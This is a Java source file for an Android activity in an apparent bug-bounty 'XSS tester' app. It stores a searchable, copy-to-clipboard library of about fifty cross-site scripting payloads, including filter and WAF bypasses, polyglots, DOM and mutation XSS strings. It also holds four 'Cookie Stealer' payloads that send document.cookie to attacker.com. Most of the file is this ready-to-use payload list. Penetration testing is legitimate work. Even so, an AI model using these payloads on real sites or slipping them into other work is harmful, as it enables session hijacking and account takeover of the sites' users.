package com.bugbounty.xsstester;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.widget.SearchView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.bugbounty.xsstester.adapters.PayloadAdapter;
import com.bugbounty.xsstester.models.Payload;
import java.util.ArrayList;
import java.util.List;

public class PayloadLibraryActivity extends AppCompatActivity {

    private RecyclerView recyclerView;
    private PayloadAdapter adapter;
    private SearchView searchView;
    private List<Payload> payloadList;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_payload_library);

        initViews();
        loadPayloads();
        setupRecyclerView();
        setupSearch();
    }

    private void initViews() {
        recyclerView = findViewById(R.id.recyclerViewPayloads);
        searchView = findViewById(R.id.searchView);
    }

    private void loadPayloads() {
        payloadList = new ArrayList<>();
        
        // ========== BASIC XSS PAYLOADS ==========
        payloadList.add(new Payload("Basic Alert", "<script>alert('XSS')</script>", "Basic"));
        payloadList.add(new Payload("Alert with Document", "<script>alert(document.domain)</script>", "Basic"));
        payloadList.add(new Payload("Image Tag", "<img src=x onerror=alert('XSS')>", "Basic"));
        payloadList.add(new Payload("SVG Onload", "<svg onload=alert('XSS')>", "Basic"));
        payloadList.add(new Payload("Body Onload", "<body onload=alert('XSS')>", "Basic"));
        payloadList.add(new Payload("Input Autofocus", "<input onfocus=alert('XSS') autofocus>", "Basic"));
        payloadList.add(new Payload("Select Autofocus", "<select onfocus=alert('XSS') autofocus>", "Basic"));
        payloadList.add(new Payload("Textarea Autofocus", "<textarea onfocus=alert('XSS') autofocus>", "Basic"));
        payloadList.add(new Payload("Iframe JavaScript", "<iframe src=javascript:alert('XSS')>", "Basic"));
        payloadList.add(new Payload("Embed JavaScript", "<embed src=javascript:alert('XSS')>", "Basic"));
        
        // ========== ADVANCED XSS PAYLOADS ==========
        payloadList.add(new Payload("DOM XSS", "javascript:alert(document.cookie)", "Advanced"));
        payloadList.add(new Payload("Event Handler", "<div onmouseover=alert('XSS')>Hover me</div>", "Advanced"));
        payloadList.add(new Payload("Link Href", "<a href=javascript:alert('XSS')>Click</a>", "Advanced"));
        payloadList.add(new Payload("Form Action", "<form action=javascript:alert('XSS')><input type=submit>", "Advanced"));
        payloadList.add(new Payload("Object Data", "<object data=javascript:alert('XSS')>", "Advanced"));
        payloadList.add(new Payload("Details Ontoggle", "<details ontoggle=alert('XSS')>", "Advanced"));
        payloadList.add(new Payload("Marquee Onstart", "<marquee onstart=alert('XSS')>", "Advanced"));
        payloadList.add(new Payload("Video Onerror", "<video src=x onerror=alert('XSS')>", "Advanced"));
        payloadList.add(new Payload("Audio Onerror", "<audio src=x onerror=alert('XSS')>", "Advanced"));
        payloadList.add(new Payload("Style Import", "<style>@import'javascript:alert(\"XSS\")';</style>", "Advanced"));
        
        // ========== FILTER BYPASS PAYLOADS ==========
        payloadList.add(new Payload("Case Variation", "<ScRiPt>alert('XSS')</sCrIpT>", "Bypass"));
        payloadList.add(new Payload("URL Encoded", "%3Cscript%3Ealert('XSS')%3C/script%3E", "Bypass"));
        payloadList.add(new Payload("Double Encoded", "%253Cscript%253Ealert('XSS')%253C/script%253E", "Bypass"));
        payloadList.add(new Payload("Null Byte", "<script>alert('XSS')%00</script>", "Bypass"));
        payloadList.add(new Payload("HTML Entities", "&lt;script&gt;alert('XSS')&lt;/script&gt;", "Bypass"));
        payloadList.add(new Payload("Unicode", "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e", "Bypass"));
        payloadList.add(new Payload("Hex Encoding", "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e", "Bypass"));
        payloadList.add(new Payload("Backticks", "<svg/onload=alert`1`>", "Bypass"));
        payloadList.add(new Payload("No Quotes", "<img src=x onerror=alert(1)>", "Bypass"));
        payloadList.add(new Payload("Comment Break", "<!--><script>alert('XSS')</script>-->", "Bypass"));
        
        // ========== WAF BYPASS PAYLOADS ==========
        payloadList.add(new Payload("WAF Bypass 1", "<svg/onload=alert`1`>", "WAF Bypass"));
        payloadList.add(new Payload("WAF Bypass 2", "<img src=x onerror=\\\"alert`1`\\\">", "WAF Bypass"));
        payloadList.add(new Payload("WAF Bypass 3", "<iframe src=\\\"javascript:alert`1`\\\">", "WAF Bypass"));
        payloadList.add(new Payload("WAF Bypass 4", "<svg><script>alert&#40;1&#41;</script>", "WAF Bypass"));
        payloadList.add(new Payload("WAF Bypass 5", "<img src=x onerror=\\u0061lert(1)>", "WAF Bypass"));
        payloadList.add(new Payload("WAF Bypass 6", "<svg><animate onbegin=alert(1)>", "WAF Bypass"));
        payloadList.add(new Payload("WAF Bypass 7", "<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>", "WAF Bypass"));
        
        // ========== POLYGLOT PAYLOADS ==========
        payloadList.add(new Payload("Polyglot 1", "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/+/[*/[]/+alert(1)//>'>", "Polyglot"));
        payloadList.add(new Payload("Polyglot 2", "'\\\"><img src=x onerror=alert(1)>", "Polyglot"));
        payloadList.add(new Payload("Polyglot 3", "jaVasCript:/*-/*`/*\\`/*'/*\\\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e", "Polyglot"));
        
        // ========== COOKIE STEALING PAYLOADS ==========
        payloadList.add(new Payload("Cookie Stealer 1", "<script>fetch('https://attacker.com?c='+document.cookie)</script>", "Cookie Steal"));
        payloadList.add(new Payload("Cookie Stealer 2", "<img src=x onerror=this.src='https://attacker.com?c='+document.cookie>", "Cookie Steal"));
        payloadList.add(new Payload("Cookie Stealer 3", "<script>new Image().src='https://attacker.com?c='+document.cookie</script>", "Cookie Steal"));
        payloadList.add(new Payload("Cookie Stealer 4", "<svg/onload=fetch('https://attacker.com?c='+document.cookie)>", "Cookie Steal"));
        
        // ========== DOM-BASED XSS ==========
        payloadList.add(new Payload("Hash Fragment", "#<img src=x onerror=alert(1)>", "DOM XSS"));
        payloadList.add(new Payload("Location Hash", "<script>eval(location.hash.slice(1))</script>", "DOM XSS"));
        payloadList.add(new Payload("Document Write", "<script>document.write(location.hash.slice(1))</script>", "DOM XSS"));
        payloadList.add(new Payload("InnerHTML", "<script>document.body.innerHTML=location.hash.slice(1)</script>", "DOM XSS"));
        
        // ========== CONTEXT-SPECIFIC PAYLOADS ==========
        payloadList.add(new Payload("Inside Attribute", "\" onload=alert(1) x=\"", "Context"));
        payloadList.add(new Payload("Inside Script Tag", "</script><script>alert(1)</script>", "Context"));
        payloadList.add(new Payload("Inside Style Tag", "</style><script>alert(1)</script>", "Context"));
        payloadList.add(new Payload("Inside Textarea", "</textarea><script>alert(1)</script>", "Context"));
        payloadList.add(new Payload("Inside Title", "</title><script>alert(1)</script>", "Context"));
        
        // ========== MUTATION XSS (mXSS) ==========
        payloadList.add(new Payload("mXSS 1", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "mXSS"));
        payloadList.add(new Payload("mXSS 2", "<svg><style><img src=x onerror=alert(1)></style>", "mXSS"));
    }

    private void setupRecyclerView() {
        adapter = new PayloadAdapter(payloadList, this, new PayloadAdapter.OnPayloadClickListener() {
            @Override
            public void onPayloadClick(Payload payload) {
                copyToClipboard(payload.getPayload());
            }
        });
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        recyclerView.setAdapter(adapter);
    }

    private void setupSearch() {
        searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener() {
            @Override
            public boolean onQueryTextSubmit(String query) {
                adapter.filter(query);
                return true;
            }

            @Override
            public boolean onQueryTextChange(String newText) {
                adapter.filter(newText);
                return true;
            }
        });
    }

    private void copyToClipboard(String text) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("XSS Payload", text);
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "Payload copied to clipboard!", Toast.LENGTH_SHORT).show();
    }
}
